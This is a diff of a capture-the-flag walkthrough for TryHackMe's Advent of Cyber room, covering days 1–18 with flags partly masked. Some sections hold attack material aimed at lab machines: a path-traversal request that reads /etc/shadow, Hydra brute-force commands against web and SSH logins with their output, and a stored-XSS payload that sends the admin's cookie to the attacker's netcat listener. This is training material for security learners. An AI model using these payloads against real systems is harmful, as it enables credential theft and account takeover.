@@ -1,5 +1,7 @@
 # Advent of Cyber
 
+[link to room](https://tryhackme.com/room/25daysofchristmas)
+
 ## Day 1 : Inventory Management 
 #### 1.	What is the name of the cookie used for authentication?
 	
@@ -367,9 +369,9 @@ THM{COIN????????????????????}
 PS C:\Users\Administrator\Desktop>
 ```
 
-## Unknown Storage
+## Day 14 : Unknown Storage
 
-#### What is the name of the file you found?
+#### 1. What is the name of the file you found?
 
 You can use check the bucket by simply browsing
 
@@ -396,7 +398,7 @@ Contents of webpage:
 > employee_??????
 
 
-#### What is in the file?
+#### 2. What is in the file?
 
 We can also simply check the whats inside the file by browsing to it
 ```bash
@@ -405,39 +407,108 @@ firefox http://advent-bucket-one.s3.amazonaws.com/employee_??????
 
 > mc?????
 
-## LFI
+## Day 15 :LFI
 
-#### What is Charlie going to book a holiday to?
+#### 1. What is Charlie going to book a holiday to?
 
 > check the website to answer the question (Haw???)
 
-#### Read /etc/shadow and crack Charlies password.
+#### 2. Read /etc/shadow and crack Charlies password.
 	
 	use burpsuite to manipulate the request and change the header (GET /get-file/%2fetc%2fshadow HTTP/1.1)
 	and crack the hash and login to machine using ssh
 
-#### What is flag1.txt?
+#### 3. What is flag1.txt?
 	
 	THM{4ea2adf84????????????????}
 
-## File Confusion
+## Day 16 :File Confusion
 
 ![day 16 script](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day16.png)
 
 For this task you have to create a python script to automate the task
 I have already created the [script](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day16-script.py) but i encourage you to make it yourself but if you stuck than you can get the guidance from here
 
-#### How many files did you extract(excluding all the .zip files)?
+#### 1. How many files did you extract(excluding all the .zip files)?
 
 > ?0
 
-#### How many files contain Version: 1.1 in their metadata?
+#### 2. How many files contain Version: 1.1 in their metadata?
 
 > ?
 
-#### Which file contains the password?
+#### 3. Which file contains the password?
 
 > ????.txt
 
+## Day 17 : Hydra-ha-ha-haa
 
+#### 1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)
 
+```bash
+hydra -l molly -P ../../rockyou.txt 10.10.252.242 http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect."
+```
+
+```
+Results:
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                                                                     
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-25 12:33:46       
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 128212 login tries (l:1/p:128212), ~8014 tries per task
+[DATA] attacking http-post-form://10.10.100.129:80/login:username=^USER^&password=^PASS^:F=incorrect                                                         
+[80][http-post-form] host: 10.10.100.129   login: molly   password: ??????       
+1 of 1 target successfully completed, 1 valid password found                       
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-25 12:33:59
+```
+> enter the creds and you will get the flag
+
+#### 2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
+
+```bash
+hydra -l molly -P path/to/wordlist ssh://10.10.252.242
+```
+```
+Hydra Results:
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-25 11:51:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 128212 login tries (l:1/p:128212), ~8014 tries per task
+[DATA] attacking ssh://10.10.252.242:22/
+[22][ssh] host: 10.10.252.242   login: molly   password: ????????
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-25 11:51:24
+```
+
+> login to ssh and you will ge the flag
+
+## Day 18 : Elf JS
+
+#### 1. What is the admin's authid cookie value?
+
+They have given us a webpage at port 3000, first create an account and lets check if this site vulnerable or not
+
+![day18-1](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day18-1.png)
+
+now press F12 and open console 
+
+![day18-2](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day18-2.png)
+
+and yay thats vulnerable and now exploit this to get admin authid
+
+first open your terminal and run netcat as root to listen for incoming connections
+```bash
+nc -lnvp 80
+```
+
+after that put this into imput section and press submit
+
+```bash
+</p><script>window.location = 'http://<your-tun0-ip>/page?param=' + document.cookie; </script><p>
+```
+
+now lets wait for admin to login to the page and we will admin authid but this is unrealistic attack as this will quickly make the page unaccessible
+
+![day18-3](https://github.com/strange07/tryhackme/blob/master/Advent%20of%20Cyber/day18-3.png)
